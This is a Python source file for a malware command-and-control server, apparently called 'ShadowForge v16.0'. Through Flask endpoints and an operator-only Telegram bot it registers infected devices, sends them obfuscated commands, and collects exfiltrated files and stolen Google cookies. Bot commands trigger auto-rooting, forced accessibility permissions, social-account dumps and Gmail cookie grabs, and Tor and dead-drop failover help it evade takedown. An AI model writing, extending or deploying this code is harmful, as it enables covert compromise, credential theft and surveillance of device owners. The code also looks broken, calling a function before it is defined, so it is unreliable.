#!/usr/bin/env python3
import os
import base64
import json
import hashlib
import hmac
import secrets
import threading
import logging
import time
import requests
from datetime import datetime
from flask import Flask, request, jsonify, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import telebot
from telebot import apihelper
from supabase import create_client
from security_shield import CryptoManager
from network_handler import ConnectionManager
from module_loader import ModuleLoader
from command_obfuscator import AIObfuscator
from failover_guard import FailoverTester
from attack_core import AttackOrchestrator

app=Flask(__name__)
app.config['nonce_store']={}

M64=os.environ.get('MASTER_SECRET_B64')
if not M64: raise ValueError("MASTER_SECRET_B64 required")
MS=base64.b64decode(M64)
SLT=os.environ.get('SALT')
if not SLT: raise ValueError("SALT required")
SLT=SLT.encode()
AID=int(os.environ.get('ADMIN_ID',0))
if AID==0: raise ValueError("ADMIN_ID required")
BT=os.environ.get('BOT_TOKENS','').split(',')
if not BT or not BT[0]: raise ValueError("BOT_TOKEN required")
SU=os.environ.get('SUPABASE_URLS','').split(',')
SK=os.environ.get('SUPABASE_KEYS','').split(',')
DD=os.environ.get('DEAD_DROP_URLS','').split(',')
GH=os.environ.get('GITHUB_RAW_URLS','').split(',')
AK=os.environ.get('ACCESS_KEY')
if not AK: raise ValueError("ACCESS_KEY required")
TP=os.environ.get('TOR_PROXY','socks5h://127.0.0.1:9050')
UT=os.environ.get('USE_TOR','false').lower()=='true'
UAC=os.environ.get('USE_AI_C2','false').lower()=='true'
AEC=os.environ.get('AI_C2_ENDPOINTS','').split(',')
UBC=os.environ.get('USE_BLOCKCHAIN','false').lower()=='true'
UP2P=os.environ.get('USE_P2P','false').lower()=='true'
UMCP=os.environ.get('USE_MCP','false').lower()=='true'

crypto=CryptoManager(MS,SLT)
cfg={
    'telegram':{'tokens':BT},
    'supabase':{'urls':SU,'keys':SK},
    'dead_drop':{'urls':DD},
    'github_raw':{'urls':GH},
    'ai_c2':{'enabled':UAC,'endpoints':AEC},
    'blockchain':{'enabled':UBC},
    'p2p':{'enabled':UP2P},
    'mcp':{'enabled':UMCP}
}
conn_mgr=ConnectionManager(cfg,crypto)
failover=FailoverTester(conn_mgr)
attack_orch=AttackOrchestrator(crypto,conn_mgr)
module_loader=ModuleLoader(crypto)
ai_obfuscator=AIObfuscator()

threading.Thread(target=failover.start_periodic_check,daemon=True).start()
threading.Thread(target=rotate_keys_periodically,daemon=True).start()

supabase_active=None
def update_supabase_client():
    global supabase_active
    a=conn_mgr.get_active_supabase()
    if a: supabase_active=create_client(a['url'],a['key'])
update_supabase_client()

limiter=Limiter(get_remote_address,app=app,default_limits=["500 per day","50 per hour"])
logging.basicConfig(level=logging.INFO)

class KeyStorage:
    def __init__(self,crypto,supabase):
        self.crypto=crypto; self.supabase=supabase
        self.cache={}; self.lock=threading.Lock()
    def get_key(self,device_id):
        with self.lock:
            if device_id in self.cache and self.cache[device_id]['expiry']>datetime.utcnow().timestamp():
                return self.cache[device_id]['key']
            if self.supabase:
                try:
                    r=self.supabase.table('device_keys').select('shared_key_enc','expiry').eq('device_id',device_id).execute()
                    if r.data:
                        ek=r.data[0]['shared_key_enc']; ex=r.data[0]['expiry']
                        if ex>datetime.utcnow().timestamp():
                            k=self.crypto.decrypt_stored_key(base64.b64decode(ek))
                            self.cache[device_id]={'key':k,'expiry':ex}; return k
                except Exception as e: logging.error(f"fetch key err {e}")
            return None
    def store_key(self,device_id,key,expiry):
        with self.lock:
            ek=base64.b64encode(self.crypto.encrypt_stored_key(key)).decode()
            if self.supabase:
                try:
                    self.supabase.table('device_keys').upsert({'device_id':device_id,'shared_key_enc':ek,'expiry':expiry}).execute()
                except Exception as e: logging.error(f"store key err {e}")
            self.cache[device_id]={'key':key,'expiry':expiry}
    def refresh_key_if_needed(self,device_id):
        with self.lock:
            if device_id in self.cache:
                r=self.cache[device_id]['expiry']-datetime.utcnow().timestamp()
                if r<600:
                    logging.info(f"key {device_id} expires soon, schedule renewal")
                    if supabase_active:
                        try:
                            supabase_active.table('service_requests').insert({
                                'target_client':device_id,'request_type':'renew_key','request_data':'{}','ticket_status':'open'
                            }).execute()
                        except Exception as e: logging.error(f"renew key err {e}")
key_storage=KeyStorage(crypto,supabase_active)

def authenticate_device(req):
    d=req.headers.get('X-Device-ID')
    n=req.headers.get('X-Nonce')
    s=req.headers.get('X-Signature')
    if not all([d,n,s]): return None
    if not is_nonce_valid(d,n): return None
    k=key_storage.get_key(d)
    if not k: return None
    e=hmac.new(k,f"{d}:{n}".encode(),hashlib.sha256).hexdigest()
    if hmac.compare_digest(e,s):
        key_storage.refresh_key_if_needed(d); return d
    return None

def is_nonce_valid(device_id,nonce):
    k=f"{device_id}:{nonce}"
    if k in app.config['nonce_store']: return False
    app.config['nonce_store'][k]=time.time()
    if len(app.config['nonce_store'])>1000:
        n=time.time()
        app.config['nonce_store']={k:v for k,v in app.config['nonce_store'].items() if n-v<300}
    return True

def rotate_keys_periodically():
    while True:
        time.sleep(3600)
        if supabase_active:
            try:
                supabase_active.table('device_keys').delete().lt('expiry',datetime.utcnow().timestamp()).execute()
            except Exception as e: logging.error(f"clean keys err {e}")

@app.route('/v16/register',methods=['POST'])
@limiter.limit("10 per minute")
def register_device():
    d=request.get_json()
    di=d.get('device_id'); pb64=d.get('public_key')
    if not di or not pb64: return jsonify({'error':'Missing fields'}),400
    pv,pu=crypto.generate_ephemeral_keypair()
    pub64=base64.b64encode(pu.public_bytes_raw()).decode()
    pub=base64.b64decode(pb64)
    sk=crypto.compute_shared_secret(pv,pub)
    exp=datetime.utcnow().timestamp()+43200
    key_storage.store_key(di,sk,exp)
    if supabase_active:
        try:
            supabase_active.table('pos_clients').upsert({
                'client_serial':di,'public_key':pb64,'first_seen':datetime.utcnow().isoformat(),'last_seen':datetime.utcnow().isoformat()
            }).execute()
        except Exception as e: logging.error(f"upsert client err {e}")
    return jsonify({'status':'registered','server_public_key':pub64,'key_expiry':exp})

@app.route('/v16/pull',methods=['GET'])
def pull_commands():
    di=authenticate_device(request)
    if not di: abort(401)
    sk=key_storage.get_key(di)
    if not sk: abort(401)
    cmds=failover.fetch_pending_commands(di,supabase_active)
    el=[]
    for c in cmds:
        co=ai_obfuscator.obfuscate_command(c)
        cj=json.dumps(co).encode()
        enc=crypto.encrypt_packet(sk,cj,aad=di.encode())
        pl=secrets.randbelow(512)+256
        enc=len(enc).to_bytes(2,'big')+enc+secrets.token_bytes(pl)
        el.append(base64.b64encode(enc).decode())
    return jsonify(el)

@app.route('/v16/push',methods=['POST'])
def push_data():
    di=authenticate_device(request)
    if not di: abort(401)
    sk=key_storage.get_key(di)
    if not sk: abort(401)
    d=request.get_json()
    ep=d.get('payload')
    if not ep: abort(400)
    try:
        dec=base64.b64decode(ep)
        rl=int.from_bytes(dec[:2],'big')
        epa=dec[2:2+rl]
        pj=crypto.decrypt_packet(sk,epa,aad=di.encode())
        pl=json.loads(pj.decode())
    except Exception as e: logging.error(f"decrypt err {e}"); abort(400)
    if supabase_active:
        try:
            supabase_active.table('pos_clients').update({
                'last_seen':datetime.utcnow().isoformat(),
                'victim_data_enc':crypto.encrypt_stored_key(json.dumps(pl.get('data',{})).encode()),
                'has_root':pl.get('data',{}).get('has_root',False),
                'has_accessibility':pl.get('data',{}).get('has_accessibility',False),
                'ip_address':request.remote_addr
            }).eq('client_serial',di).execute()
        except Exception as e: logging.error(f"update client err {e}")
    pt=pl.get('type')
    if pt=='command_result':
        cid=pl.get('command_id'); res=pl.get('result'); suc=pl.get('success',True)
        if supabase_active and cid:
            try:
                supabase_active.table('service_requests').update({
                    'ticket_status':'done' if suc else 'failed','resolution_log':res
                }).eq('ticket_id',cid).execute()
            except Exception as e: logging.error(f"update cmd result err {e}")
        failover.send_message_to_admin(f"Result from {di}:\n{res[:200]}")
    elif pt=='file':
        fn=pl.get('filename'); fd=base64.b64decode(pl.get('data',''))
        if supabase_active:
            try:
                sp=f"exfil/{di}/{fn}"
                supabase_active.storage.from_('exfil').upload(sp,fd)
                failover.send_message_to_admin(f"File from {di}: {fn}")
            except Exception as e: logging.error(f"upload file err {e}")
    elif pt=='network_scan': attack_orch.process_network_scan(di,pl.get('data'))
    elif pt=='nearby_devices': attack_orch.process_nearby_devices(di,pl.get('data'))
    elif pt=='google_cookies':
        ck=pl.get('cookies')
        if ck and supabase_active:
            try:
                supabase_active.table('stolen_cookies').insert({
                    'device_id':di,'cookies':json.dumps(ck),'timestamp':datetime.utcnow().isoformat()
                }).execute()
                failover.send_message_to_admin(f"Google cookies stolen from {di}")
            except Exception as e: logging.error(f"store cookies err {e}")
    return jsonify({'status':'ok'})

@app.route('/v16/config',methods=['GET'])
def get_config():
    di=authenticate_device(request)
    if not di: abort(401)
    sk=key_storage.get_key(di)
    if not sk: abort(401)
    cc=conn_mgr.get_active_config()
    enc=crypto.encrypt_packet(sk,json.dumps(cc).encode(),aad=di.encode())
    return jsonify({'config':base64.b64encode(enc).decode()})

@app.route('/api/clients',methods=['GET'])
def list_clients():
    a=request.headers.get('X-Service-Auth')
    if not a or not hmac.compare_digest(a,AK): abort(401)
    if not supabase_active: return jsonify([])
    try:
        r=supabase_active.table('pos_clients').select('client_serial,operational_status,last_seen').execute()
        return jsonify(r.data)
    except Exception as e: logging.error(f"list clients err {e}"); return jsonify([])

@app.route('/api/command',methods=['POST'])
def create_command():
    a=request.headers.get('X-Service-Auth')
    if not a or not hmac.compare_digest(a,AK): abort(401)
    d=request.json
    t=d.get('target_client'); rt=d.get('request_type'); rd=d.get('request_data','')
    if not t or not rt: return jsonify({'error':'missing fields'}),400
    if supabase_active:
        try:
            supabase_active.table('service_requests').insert({
                'target_client':t,'request_type':rt,'request_data':rd,'ticket_status':'open'
            }).execute()
        except Exception as e: logging.error(f"create cmd err {e}")
    return jsonify({'status':'created'})

@app.route('/api/results',methods=['GET'])
def get_results():
    a=request.headers.get('X-Service-Auth')
    if not a or not hmac.compare_digest(a,AK): abort(401)
    if not supabase_active: return jsonify([])
    try:
        r=supabase_active.table('service_requests')\
            .select('target_client,resolution_log,updated_at')\
            .neq('resolution_log',None)\
            .order('updated_at',desc=True)\
            .limit(10).execute()
        return jsonify(r.data)
    except Exception as e: logging.error(f"get results err {e}"); return jsonify([])

bot=telebot.TeleBot(BT[0])
if UT: apihelper.proxy={'https':TP}

@bot.message_handler(commands=['start','help'])
def help_command(m):
    if m.from_user.id!=AID: return
    t="""
ShadowForge v16.0 – Apocalyptic
Basic: /list, /cmd [id] [cmd]
Advanced: /root, /nearby_scan, /social_dump, /accessibility, /grab_gmail
    """
    bot.reply_to(m,t,parse_mode='Markdown')

@bot.message_handler(commands=['list'])
def list_devices(m):
    if m.from_user.id!=AID or not supabase_active: return
    try:
        r=supabase_active.table('pos_clients').select('client_serial,last_seen,operational_status').order('last_seen',desc=True).limit(20).execute()
        dv=r.data
        if not dv: bot.reply_to(m,"No devices."); return
        msg="**Active devices:**\n"
        for d in dv:
            lst=d.get('last_seen','unknown')[:16]
            st="🟢" if d.get('operational_status')=='online' else "🔴"
            msg+=f"{st} `{d['client_serial']}` last: {lst}\n"
        bot.reply_to(m,msg,parse_mode='Markdown')
    except Exception as e: bot.reply_to(m,f"Error: {e}")

@bot.message_handler(commands=['cmd'])
def send_command(m):
    if m.from_user.id!=AID or not supabase_active: return
    p=m.text.split(maxsplit=2)
    if len(p)<3: bot.reply_to(m,"Usage: /cmd [device_id] [command]"); return
    did,cmd=p[1],p[2]
    obf=ai_obfuscator.obfuscate_command(cmd)
    try:
        supabase_active.table('service_requests').insert({
            'target_client':did,'request_type':obf,'request_data':cmd,'ticket_status':'open'
        }).execute()
        bot.reply_to(m,f"✅ Command `{cmd}` queued for `{did}`")
    except Exception as e: bot.reply_to(m,f"❌ Error: {e}")

@bot.message_handler(commands=['root'])
def auto_root(m):
    if m.from_user.id!=AID or not supabase_active: return
    p=m.text.split()
    if len(p)<2: bot.reply_to(m,"Usage: /root [device_id]"); return
    did=p[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client':did,'request_type':'auto_root','request_data':'{}','ticket_status':'open'
        }).execute()
        bot.reply_to(m,f"🔥 Root queued for {did}")
    except Exception as e: bot.reply_to(m,f"❌ Error: {e}")

@bot.message_handler(commands=['nearby_scan'])
def nearby_scan(m):
    if m.from_user.id!=AID or not supabase_active: return
    p=m.text.split()
    if len(p)<2: bot.reply_to(m,"Usage: /nearby_scan [device_id]"); return
    did=p[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client':did,'request_type':'nearby_scan','request_data':'{}','ticket_status':'open'
        }).execute()
        bot.reply_to(m,f"🔍 Scan queued for {did}")
    except Exception as e: bot.reply_to(m,f"❌ Error: {e}")

@bot.message_handler(commands=['social_dump'])
def social_dump(m):
    if m.from_user.id!=AID or not supabase_active: return
    p=m.text.split()
    if len(p)<2: bot.reply_to(m,"Usage: /social_dump [device_id]"); return
    did=p[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client':did,'request_type':'social_dump','request_data':'{}','ticket_status':'open'
        }).execute()
        bot.reply_to(m,f"📱 Social dump queued for {did}")
    except Exception as e: bot.reply_to(m,f"❌ Error: {e}")

@bot.message_handler(commands=['accessibility'])
def force_accessibility(m):
    if m.from_user.id!=AID or not supabase_active: return
    p=m.text.split()
    if len(p)<2: bot.reply_to(m,"Usage: /accessibility [device_id]"); return
    did=p[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client':did,'request_type':'force_accessibility','request_data':'{}','ticket_status':'open'
        }).execute()
        bot.reply_to(m,f"♿ Accessibility forced for {did}")
    except Exception as e: bot.reply_to(m,f"❌ Error: {e}")

@bot.message_handler(commands=['grab_gmail'])
def grab_gmail(m):
    if m.from_user.id!=AID or not supabase_active: return
    p=m.text.split()
    if len(p)<2: bot.reply_to(m,"Usage: /grab_gmail [device_id]"); return
    did=p[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client':did,'request_type':'grab_gmail_cookies','request_data':'{}','ticket_status':'open'
        }).execute()
        bot.reply_to(m,f"🍪 Gmail grab queued for {did}")
    except Exception as e: bot.reply_to(m,f"❌ Error: {e}")

def start_bot(): bot.infinity_polling()

if __name__=='__main__':
    threading.Thread(target=start_bot,daemon=True).start()
    port=int(os.environ.get('PORT',10000))
    app.run(host='0.0.0.0',port=port,debug=False,threaded=True)